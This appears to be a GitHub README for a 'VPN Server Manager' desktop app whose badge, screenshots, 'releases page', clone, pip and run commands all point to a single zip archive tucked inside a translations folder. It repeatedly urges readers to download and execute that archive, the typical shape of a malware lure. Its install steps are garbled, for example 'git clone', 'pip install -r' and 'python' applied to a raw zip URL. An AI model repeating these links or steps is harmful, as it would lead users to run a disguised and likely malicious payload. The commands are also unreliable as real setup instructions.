[![VPN Server Manager — Releases](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip%20Assets-blue?logo=github&https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)

# VPN Server Manager: Hybrid Flask + PyWebView Desktop Tool

A smart, native-feel desktop app to manage VPN servers. It blends a Flask backend with a PyWebView frontend for a fast, offline-capable experience. Built for professionals who want encryption, reliability, and a clean user interface in one package.

---

## 🧭 Quick overview

- Hybrid desktop app with a native interface
- Strong encryption using Fernet
- Offline mode for reliable work without internet
- Import and export of configurations
- Cross-platform readiness (macOS, Windows, Linux)
- Clean, secure UX designed for admins and operators

This project aims to deliver a calm, capable tool for VPN server management. It uses a small, fast Flask server to handle data and a PyWebView window to provide a native-feeling user interface. Sensitive data is stored securely with Fernet encryption, so you can manage credentials and server configurations with confidence, even offline.

---

## 🧰 Features at a glance

- Hybrid architecture: Flask backend with a PyWebView frontend
- Local-first operation: run entirely on your workstation
- Encryption: Fernet-powered crypto for secrets and keys
- Native feel: a smooth, desktop-grade UI without a browser tab
- Offline mode: work without relying on cloud services
- Import/Export: exchange configurations with portable formats
- Cross-platform: works on macOS, Windows, and Linux
- Lightweight: designed for quick launches and low resource use
- Extensible: structured codebase to add features over time

---

## 🧩 Architecture and design

This project follows a hybrid pattern to deliver a robust, responsive desktop experience:

- Backend: Flask
  - Lightweight REST endpoints to manage VPN servers, groups, credentials, and metadata
  - Simple, deterministic API that can be consumed by the UI layer
  - Local data store (JSON, SQLite, or encrypted storage) to keep offline capabilities intact
- Frontend: PyWebView
  - A native window that hosts a web-based UI
  - Interacts with the Flask backend via HTTP calls to localhost
  - Designed to feel like a native macOS/Windows/Linux app, not a web page
- Security layer
  - Data at rest is encrypted with Fernet symmetric encryption
  - Secrets are protected by a master key stored securely in the app’s environment or OS keychain
- Data lifecycle
  - Configs, server entries, and credentials can be imported and exported
  - Exported data can be encrypted for transport if needed
- Offline-first philosophy
  - Core features work without network access
  - Network features (sync, remote backups) are optional and opt-in

This approach ensures a fast, responsive user experience with strong security guarantees and a familiar desktop workflow.

---

## 🖼️ Screenshots and visuals

Note: the images below are placeholders to illustrate the UI concept. Replace them with real captures when you publish builds.

- Main dashboard and server list
  ![Screenshot 1](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)

- Server detail and controls
  ![Screenshot 2](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)

- Import/export flow
  ![Screenshot 3](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)

- Settings and encryption options
  ![Screenshot 4](https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)

Screenshots help users understand the layout, the actions available, and how the data flows through the app. You can replace these placeholders with actual localized screenshots as you finalize the UI.

---

## 🧭 Getting started

This project is designed for developers and operators who want to run and extend their own VPN server management tool locally. The setup aims to be straightforward, with sensible defaults and clear guidance for power users.

- Prerequisites
  - Python 3.9 or newer
  - A platform with a modern shell (macOS Terminal, Windows PowerShell/WSL, Linux terminal)
  - Basic familiarity with running commands and editing config files
- What you’ll get
  - A desktop app that runs locally
  - A secure backend that handles server data
  - An easy-to-use frontend that mirrors common admin workflows

First, clone the repository, then install dependencies and start the app. The app is designed to work offline, but you may opt to enable remote backups or syncing when a network is available.

Access to the official releases page is provided below to download the installer or bundle appropriate for your platform. This page hosts release artifacts you can download and run locally. See the link here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

---

## 🚀 Installation from source

Follow these steps to set up the project on your workstation. The process keeps things simple while offering flexibility for customization.

1) Clone the repository
- git clone https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
- cd vpn-server-manager

2) Create a virtual environment
- python -m venv venv
- source venv/bin/activate  # macOS/Linux
- venv\Scripts\activate     # Windows

3) Install dependencies
- pip install -r https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

4) Configure encryption key (Fernet)
- You’ll need to set a master key for Fernet. The project provides a sample environment setup; follow the docs to create and store the key securely (e.g., in a protected file or OS keychain). This key is needed to encrypt and decrypt sensitive data locally.

5) Prepare the local store
- The app stores configurations and credentials locally. If a schema file or database file is provided, ensure it exists or let the app initialize it on first run.

6) Run the app
- python https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
- Or start the Flask backend and launch the PyWebView window:
  - python -m https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip  # if a module route is provided
  - python https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip           # if the UI script starts the PyWebView window

7) Access the UI
- The PyWebView window will appear, loading the local Flask frontend.
- Use the UI to add VPN servers, configure credentials, apply encryption settings, set up import/export, and manage offline backups.

8) Import and export data
- Use the Import option in the UI to load configurations from a file.
- Use Export to save a portable copy of your configuration, with optional encryption for transport.

9) Troubleshooting
- If the UI does not load, verify that the backend is running and that the localhost port matches the UI’s expectations.
- Check the environment variables for the encryption key and adjust permissions if needed.

10) Packaging for distribution
- After validating locally, you can package the app as a native installer for macOS, Windows, or Linux. The project includes guidance on using PyInstaller or similar tools to bundle the Python runtime with the app.

Notes:
- If you want a one-click installer, use the provided releases page. This page hosts artifacts that are ready to download and run on your OS. The link is available here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

---

## 🧭 How the data flows

- The browser-like UI sends HTTP requests to the Flask backend running on localhost.
- The backend performs actions on the local data store, including reading, writing, updating, and deleting VPN server configurations.
- Encryption is applied to sensitive fields (like credentials, tokens, and keys) before storage. Fernet ensures confidentiality and integrity with minimal performance impact.
- Exported data is a portable snapshot that can be decrypted by the same app or a compatible tool. You can choose to export with or without encryption, depending on your threat model and workflow.

This separation of concerns keeps the UI responsive while ensuring the backend handles the business logic in a secure, auditable way.

---

## 🔐 Security and encryption

- Encryption: Fernet symmetric encryption is used to protect sensitive data at rest. Fernet provides authenticated encryption, which ensures that data cannot be modified without detection.
- Key management: A master key is required to encrypt and decrypt data. Store this key securely. The recommended approach is to use the OS keychain or a dedicated secret store. Never commit the key to version control.
- Data at rest: All credentials, tokens, and server metadata stored locally are encrypted. This minimizes exposure if the device is compromised.
- Offline-first security posture: Because the app can operate offline, it reduces exposure to external threats during daily work. When online features are used, secure channels and proper validation apply, and you should enable TLS where appropriate for any networked backups or remote synchronization.
- Access control: The UI can be extended with user roles and basic access checks. The initial design focuses on desktop single-user operation, with potential for multi-user scenarios in future iterations.

These measures aim to provide a practical security baseline for a local management tool, balancing usability with protection of sensitive VPN configuration data.

---

## 🧰 Developer guide: contributing and extending

- Code structure
  - backend: Flask application that implements the core APIs
  - frontend: PyWebView-based UI that consumes the Flask API
  - core: encryption utilities, data models, and common helpers
- Running tests
  - pytest or your preferred test harness for unit tests
  - Mock the local data store and encryption layer to verify API behavior
- Adding features
  - Follow the existing coding style and naming conventions
  - Add tests for new features
  - Update documentation to reflect new capabilities
- Packaging
  - Include a packaging script to build native installers for macOS, Windows, and Linux
  - Ensure the packaging process bundles the Python runtime and dependencies safely
- Localization
  - Consider adding translations for UI strings to support non-English users
  - Use a centralized i18n mechanism to manage locales

This project welcomes thoughtful contributions that improve reliability, security, and usability. If you plan to contribute, start by opening issues and submitting pull requests with clear descriptions and test coverage.

---

## 🗺️ Roadmap and future directions

- Improved data formats for import/export, including YAML and CSV
- Multi-user mode with role-based access control
- Remote backups with optional end-to-end encryption
- More granular encryption policies and key rotation guidance
- Native notifications and OS integration for alerts
- Automated testing across macOS, Windows, and Linux environments
- Enhanced accessibility features for keyboard navigation and screen readers
- Performance profiling and optimization for large VPN server catalogs

The roadmap centers on making the tool more robust, scalable, and easy to integrate into existing admin workflows, while preserving the offline-first ethos.

---

## 🧭 How to use the releases page (downloads)

For the easiest path to start using VPN Server Manager, visit the official releases page to grab a ready-to-run package. This page hosts installer bundles or platform-specific archives that you can download and execute to install the app on your system. It’s the fastest way to get up and running without building from source. See the releases page here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

If you prefer to review the source, or want to run from development, follow the installation-from-source steps above. The releases page is still a great fallback to obtain tested builds, especially when you need a stable, pre-packaged experience for production use.

---

## 🗂️ Project structure overview

- vpn-server-manager/
  - backend/
    - api/
    - models/
    - services/
  - ui/
    - templates/
    - static/
  - core/
    - crypto/
    - data/
  - tests/
  - docs/
  - https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip or https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
- https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip
- https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip (this file)

This layout keeps responsibilities clean and makes it easier to reason about data flow, security, and UI logic. The backend handles persistence and business rules, while the frontend focuses on rendering a crisp, responsive interface and capturing user intent.

---

## 🧭 Accessibility and usability

- Clear typography and contrast on all screens
- Consistent layout across devices and resolutions
- Keyboard shortcuts for common tasks (create new server, export, import, search)
- Tooltips and inline help text to reduce user error
- Internationalization hooks to enable translations in future releases

The goal is to deliver an calm, predictable experience that reduces cognitive load while enabling admins to perform their tasks quickly and accurately.

---

## 🧬 Data model snapshot

- Server entry
  - id: unique identifier
  - name: display name
  - host: IP or hostname
  - port: management port
  - credentials: encrypted
  - status: online/offline/needs-update
  - notes: optional descriptive text
- Credential pack
  - id: unique
  - type: password | certificate | token
  - value: encrypted
  - metadata: usage notes, expiry, scope
- Configuration
  - is_default: boolean
  - backup_frequency: interval
  - encryption_settings: Fernet key id, algorithm
  - export_format: json/yaml
- Export/Import
  - format: json | yaml
  - encrypted: boolean
  - file_path: on-disk location for the import/export operation

This simplified model focuses on essential attributes needed for operational VPN server management while keeping encryption and data handling straightforward.

---

## ❓ Frequently asked questions (concise)

- Is this tool free to use?
  - Yes, it’s designed to be openly usable and adaptable for your environment.
- Does it require internet access?
  - It favors offline operation. Internet is only needed for optional remote features or updates.
- Can I run this on macOS?
  - Yes. The hybrid Flask + PyWebView approach is platform-agnostic and supports macOS with a native feel.
- How is data protected?
  - Data at rest is encrypted with Fernet. Keys are kept secure using your chosen storage mechanism.

If you need answers beyond these basics, consult the project’s docs and tests after installing and running the app locally.

---

## 📚 Documentation and resources

- Quick start guide: a concise setup pathway for new users
- API reference: details about available endpoints and data structures
- Encryption guide: how Fernet is used and how to manage keys
- Data export/import guide: supported formats and workflows
- Packaging guide: how to bundle the app for distribution

All docs are designed to be approachable for both developers and system administrators. They provide practical steps, examples, and troubleshooting tips.

---

## 🗣️ Community and collaboration

- For issues and feature requests, open an issue on GitHub with a clear title and a detailed description
- For code contributions, fork the repo, implement changes, and submit a pull request with tests
- Follow a consistent commit message pattern and include a changelog entry for user-visible changes

A thoughtful, collaborative approach helps the project mature while maintaining reliability and security.

---

## 🧪 Testing and quality assurance

- Unit tests cover data models, encryption routines, and core business logic
- Integration tests validate end-to-end flows between the Flask backend and PyWebView frontend
- Manual tests verify offline behavior, import/export flows, and UI consistency
- CI pipelines run on push and pull request to ensure regressions are caught early

Quality is a priority. Tests and CI help ensure that new features do not compromise existing workflows.

---

## 🧭 Release notes and versioning

- Semver-compliant versioning (https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip)
- Changelog entries accompany each release
- Release artifacts include platform-specific installers or bundles
- Security patches are backported where feasible and documented

Keeping track of changes helps users understand new capabilities and fixes.

---

## 🧭 Contact and support

- Project maintainers are available for questions, guidance, and code reviews
- Use GitHub Issues for bug reports and feature requests
- For urgent security concerns, follow the project’s responsible disclosure process

The aim is to provide a dependable tool with clear, practical support channels.

---

## 🧭 Final note on the release link

For the easiest path to get the software on your machine, the official releases page is your best bet. It hosts installers and platform-specific bundles you can download and run directly. Visit the releases page here: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

If you’re exploring the source or building from scratch, use the installation-from-source instructions above. The releases page remains a reliable option for tested, ready-to-use builds. The link again for convenience: https://raw.githubusercontent.com/hidougaming/vpn-server-manager/main/translations/en/LC_MESSAGES/vpn_server_manager_unadherent.zip

---

## 🗂️ Topics

- cryptography
- encryption
- flask
- gui
- macos
- pywebview
- security
- server-management
- vpn
- webview

---

> End of document